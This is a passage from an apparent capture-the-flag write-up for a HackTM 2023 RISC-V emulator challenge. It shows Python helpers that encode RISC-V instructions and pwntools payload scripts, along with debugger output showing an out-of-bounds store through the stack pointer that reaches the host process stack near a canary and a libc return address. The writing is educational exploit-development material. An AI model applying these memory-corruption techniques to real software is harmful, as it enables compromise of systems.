</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>registers <span style="color:#555">=</span> [
</span></span><span style="display:flex;"><span>    <span style="color:#c30">&#34;zero&#34;</span>, <span style="color:#c30">&#34;ra&#34;</span>,  <span style="color:#c30">&#34;sp&#34;</span>,  <span style="color:#c30">&#34;gp&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#c30">&#34;tp&#34;</span>, <span style="color:#c30">&#34;t0&#34;</span>,  <span style="color:#c30">&#34;t1&#34;</span>,  <span style="color:#c30">&#34;t2&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#c30">&#34;s0&#34;</span>, <span style="color:#c30">&#34;s1&#34;</span>,  <span style="color:#c30">&#34;a0&#34;</span>,  <span style="color:#c30">&#34;a1&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#c30">&#34;a2&#34;</span>, <span style="color:#c30">&#34;a3&#34;</span>,  <span style="color:#c30">&#34;a4&#34;</span>,  <span style="color:#c30">&#34;a5&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#c30">&#34;a6&#34;</span>, <span style="color:#c30">&#34;a7&#34;</span>,  <span style="color:#c30">&#34;s2&#34;</span>,  <span style="color:#c30">&#34;s3&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#c30">&#34;s4&#34;</span>, <span style="color:#c30">&#34;s5&#34;</span>,  <span style="color:#c30">&#34;s6&#34;</span>,  <span style="color:#c30">&#34;s7&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#c30">&#34;s8&#34;</span>, <span style="color:#c30">&#34;s9&#34;</span>, <span style="color:#c30">&#34;s10&#34;</span>, <span style="color:#c30">&#34;s11&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#c30">&#34;t3&#34;</span>, <span style="color:#c30">&#34;t4&#34;</span>,  <span style="color:#c30">&#34;t5&#34;</span>,  <span style="color:#c30">&#34;t6&#34;</span>,
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>register_key <span style="color:#555">=</span> {}
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> idx, val <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">enumerate</span>(registers):
</span></span><span style="display:flex;"><span>    register_key[val] <span style="color:#555">=</span> idx
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">reg</span>(key):
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> register_key[key]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">new_inst</span>(opcode, funct3<span style="color:#555">=</span><span style="color:#f60">0</span>, funct7<span style="color:#555">=</span><span style="color:#f60">0</span>, rd<span style="color:#555">=</span><span style="color:#f60">0</span>, rs1<span style="color:#555">=</span><span style="color:#f60">0</span>, rs2<span style="color:#555">=</span><span style="color:#f60">0</span>, imm_i<span style="color:#555">=</span><span style="color:#f60">0</span>, imm_s<span style="color:#555">=</span><span style="color:#f60">0</span>):
</span></span><span style="display:flex;"><span>    inst <span style="color:#555">=</span> <span style="color:#f60">2</span><span style="color:#555">**</span><span style="color:#f60">32</span>
</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic"># Set opcode</span>
</span></span><span style="display:flex;"><span>    inst <span style="color:#555">|=</span> (opcode <span style="color:#555">&amp;</span> <span style="color:#f60">0x7f</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic"># Set funct3</span>
</span></span><span style="display:flex;"><span>    inst <span style="color:#555">|=</span> ((funct3 <span style="color:#555">&amp;</span> <span style="color:#f60">0x7</span>) <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">12</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic"># Set funct7</span>
</span></span><span style="display:flex;"><span>    inst <span style="color:#555">|=</span> ((funct7 <span style="color:#555">&amp;</span> <span style="color:#f60">0x7f</span>) <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">25</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic"># Set rd</span>
</span></span><span style="display:flex;"><span>    inst <span style="color:#555">|=</span> ((rd <span style="color:#555">&amp;</span><span style="color:#f60">0x1f</span>) <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">7</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic"># Set rs1</span>
</span></span><span style="display:flex;"><span>    inst <span style="color:#555">|=</span> ((rs1 <span style="color:#555">&amp;</span><span style="color:#f60">0x1f</span>) <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">15</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic"># Set rs2</span>
</span></span><span style="display:flex;"><span>    inst <span style="color:#555">|=</span> ((rs2 <span style="color:#555">&amp;</span><span style="color:#f60">0x1f</span>) <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">20</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic"># Set imm_i</span>
</span></span><span style="display:flex;"><span>    inst <span style="color:#555">|=</span> ((imm_i <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">20</span>) <span style="color:#555">&amp;</span> <span style="color:#f60">0xfff00000</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic"># Set imm_s</span>
</span></span><span style="display:flex;"><span>    inst <span style="color:#555">|=</span> ((imm_s <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">20</span>) <span style="color:#555">&amp;</span> <span style="color:#f60">0xfe000000</span>)
</span></span><span style="display:flex;"><span>    inst <span style="color:#555">|=</span> ((imm_s <span style="color:#555">&amp;</span> <span style="color:#f60">0x1f</span>) <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">7</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> <span style="color:#366">bytes</span><span style="color:#555">.</span>fromhex(<span style="color:#366">hex</span>(inst <span style="color:#555">&amp;</span> (<span style="color:#f60">2</span><span style="color:#555">**</span><span style="color:#f60">32</span><span style="color:#555">-</span><span style="color:#f60">1</span>))[<span style="color:#f60">2</span>:]<span style="color:#555">.</span>rjust(<span style="color:#f60">8</span>, <span style="color:#c30">&#39;0&#39;</span>))[::<span style="color:#555">-</span><span style="color:#f60">1</span>]<span style="color:#555">.</span>hex()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">dram_load_32</span>(hex_str):
</span></span><span style="display:flex;"><span>    bytecode <span style="color:#555">=</span> <span style="color:#366">bytes</span><span style="color:#555">.</span>fromhex(hex_str)
</span></span><span style="display:flex;"><span>    inst <span style="color:#555">=</span> bytecode[<span style="color:#f60">0</span>] <span style="color:#555">|</span> bytecode[<span style="color:#f60">1</span>] <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">8</span> <span style="color:#555">|</span> bytecode[<span style="color:#f60">2</span>] <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">16</span> <span style="color:#555">|</span> bytecode[<span style="color:#f60">3</span>] <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">24</span>
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> inst
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">exec_SD</span>(addr_reg, offset, value):
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> new_inst(<span style="color:#f60">0x23</span>, funct3<span style="color:#555">=</span><span style="color:#f60">0x3</span>, rs1<span style="color:#555">=</span>addr_reg, rs2<span style="color:#555">=</span>value, imm_s<span style="color:#555">=</span>offset)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">exec_LD</span>(addr_reg, offset, reg_target):
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> new_inst(<span style="color:#f60">0x03</span>, funct3<span style="color:#555">=</span><span style="color:#f60">0x3</span>, rs1<span style="color:#555">=</span>addr_reg, rd<span style="color:#555">=</span>reg_target, imm_i<span style="color:#555">=</span>offset)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">exec_ADDI</span>(target, src, value):
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> new_inst(<span style="color:#f60">0x13</span>, funct3<span style="color:#555">=</span><span style="color:#f60">0x0</span>, rd<span style="color:#555">=</span>target, rs1<span style="color:#555">=</span>src, imm_i<span style="color:#555">=</span>value)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">exec_SLLI</span>(target, src, shift):
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> new_inst(<span style="color:#f60">0x13</span>, funct3<span style="color:#555">=</span><span style="color:#f60">0x1</span>, rd<span style="color:#555">=</span>target, rs1<span style="color:#555">=</span>src, imm_i<span style="color:#555">=</span>shift)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">exec_SUBW</span>(target, reg_src, reg_src2):
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> new_inst(<span style="color:#f60">0x3b</span>, funct3<span style="color:#555">=</span><span style="color:#f60">0x0</span>, funct7<span style="color:#555">=</span><span style="color:#f60">0x20</span>, rd<span style="color:#555">=</span>target, rs1<span style="color:#555">=</span>reg_src, rs2<span style="color:#555">=</span>reg_src2)
</span></span></code></pre></td></tr></table>
</div>
</div><p>The helper above is built based on inspecting how the <code>cpu_execute</code> function processes the instructions bytecode from the input file. Now that we have set the appropriate helper, let&rsquo;s try to execute it for the first time to build our first payload to test it. Below is the example code that I used during analyzing the code.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">tempfile</span> <span style="color:#069;font-weight:bold">import</span> NamedTemporaryFile
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">=</span> <span style="color:#c30">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a0&#39;</span>), reg(<span style="color:#c30">&#39;a0&#39;</span>), <span style="color:#f60">0x41</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>d <span style="color:#555">=</span> <span style="color:#366">bytes</span><span style="color:#555">.</span>fromhex(payload)
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">with</span> NamedTemporaryFile() <span style="color:#069;font-weight:bold">as</span> temp_file:
</span></span><span style="display:flex;"><span>    temp_file<span style="color:#555">.</span>write(d)
</span></span><span style="display:flex;"><span>    temp_file<span style="color:#555">.</span>flush()
</span></span><span style="display:flex;"><span>    filename <span style="color:#555">=</span> temp_file<span style="color:#555">.</span>name
</span></span><span style="display:flex;"><span>    <span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#39;Temp filename: </span><span style="color:#a00">{</span>filename<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>    pause()
</span></span></code></pre></td></tr></table>
</div>
</div><p>After running the above code, it will generate a temp file, and then we can use the temp file to run the <code>main</code> in a separate terminal. Trying to use the generated temp file, below is the example output of the emulator</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0x80000000 -&gt; addi
</span></span><span style="display:flex;"><span>   zero: 00                s0: 00                a6: 00                 s8: 00
</span></span><span style="display:flex;"><span>     ra: 00                s1: 00                a7: 00                 s9: 00
</span></span><span style="display:flex;"><span>     sp: 0x80100000        a0: 0x41              s2: 00                s10: 00
</span></span><span style="display:flex;"><span>     gp: 00                a1: 00                s3: 00                s11: 00
</span></span><span style="display:flex;"><span>     tp: 00                a2: 00                s4: 00                 t3: 00
</span></span><span style="display:flex;"><span>     t0: 00                a3: 00                s5: 00                 t4: 00
</span></span><span style="display:flex;"><span>     t1: 00                a4: 00                s6: 00                 t5: 00
</span></span><span style="display:flex;"><span>     t2: 00                a5: 00                s7: 00                 t6: 00
</span></span></code></pre></td></tr></table>
</div>
</div><p>We have successfully changed the <code>a0</code> value to <code>0x41</code>. Now, notice that the <code>sp</code> register value is <code>0x80100000</code>. Remember that the max size of array <code>mem</code> is <code>0x100000</code>, and if we try to access the memory of the address <code>0x80100000</code>, that means we will try to get the value of <code>mem[addr-DRAM_BASE]</code>, which is <code>mem[0x100000]</code>. For example, if we try to increase the <code>sp</code> value by <code>0x10</code>, that means we have achieved OOB access.</p>
<p>Let&rsquo;s try to check it by using this payload.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#555">=</span> <span style="color:#c30">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a0&#39;</span>), reg(<span style="color:#c30">&#39;a0&#39;</span>), <span style="color:#f60">0x41</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SLLI(reg(<span style="color:#c30">&#39;a0&#39;</span>), reg(<span style="color:#c30">&#39;a0&#39;</span>), <span style="color:#f60">8</span>) <span style="color:#09f;font-style:italic"># Shift left &lt;&lt; 8</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a0&#39;</span>), reg(<span style="color:#c30">&#39;a0&#39;</span>), <span style="color:#f60">0x41</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SLLI(reg(<span style="color:#c30">&#39;a0&#39;</span>), reg(<span style="color:#c30">&#39;a0&#39;</span>), <span style="color:#f60">8</span>) <span style="color:#09f;font-style:italic"># Shift left &lt;&lt; 8</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a0&#39;</span>), reg(<span style="color:#c30">&#39;a0&#39;</span>), <span style="color:#f60">0x41</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SLLI(reg(<span style="color:#c30">&#39;a0&#39;</span>), reg(<span style="color:#c30">&#39;a0&#39;</span>), <span style="color:#f60">8</span>) <span style="color:#09f;font-style:italic"># Shift left &lt;&lt; 8</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_ADDI(reg(<span style="color:#c30">&#39;a0&#39;</span>), reg(<span style="color:#c30">&#39;a0&#39;</span>), <span style="color:#f60">0x41</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_SD(reg(<span style="color:#c30">&#39;sp&#39;</span>), <span style="color:#f60">0x10</span>, reg(<span style="color:#c30">&#39;a0&#39;</span>))
</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> exec_LD(reg(<span style="color:#c30">&#39;sp&#39;</span>), <span style="color:#f60">0x58</span>, reg(<span style="color:#c30">&#39;a1&#39;</span>)) <span style="color:#09f;font-style:italic"># We only add this to set breakpoint in exec_LD, so that we can inspect the memory before the emulator exit</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The above payload trying to store <code>0x41414141</code> to <code>mem[sp+0x8]</code>. <code>exec_ADDI</code> only support 12-bit signed number based on my observation in the source code, so to set <code>a0</code> value, I use the help of <code>&lt;&lt; 8</code>. Let&rsquo;s try to inspect it in gdb to check where our <code>0x41414141</code> value is stored.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>pwndbg&gt; search -4 0x41414141
</span></span><span style="display:flex;"><span>Searching for value: b&#39;AAAA&#39;
</span></span><span style="display:flex;"><span>[stack]         0x7fffffef54a0 0x41414141 /* &#39;AAAA&#39; */
</span></span><span style="display:flex;"><span>[stack]         0x7fffffffd490 0x41414141 /* &#39;AAAA&#39; */
</span></span><span style="display:flex;"><span>pwndbg&gt; tele 0x7fffffffd480 10
</span></span><span style="display:flex;"><span>00:0000│  0x7fffffffd480 —▸ 0x7fffffffd580 ◂— 0x2
</span></span><span style="display:flex;"><span>01:0008│  0x7fffffffd488 ◂— 0xfdc8b2d89266d800
</span></span><span style="display:flex;"><span>02:0010│  0x7fffffffd490 ◂— 0x41414141 /* &#39;AAAA&#39; */
</span></span><span style="display:flex;"><span>03:0018│  0x7fffffffd498 —▸ 0x7ffff7dfa083 (__libc_start_main+243) ◂— mov edi, eax
</span></span><span style="display:flex;"><span>04:0020│  0x7fffffffd4a0 ◂— 0x21 /* &#39;!&#39; */
</span></span><span style="display:flex;"><span>05:0028│  0x7fffffffd4a8 —▸ 0x7fffffffd588 —▸ 0x7fffffffd904 ◂— &#39;/home/chovid99/ctf-journey/2023/hacktm/cs2100/chal/main_patched&#39;
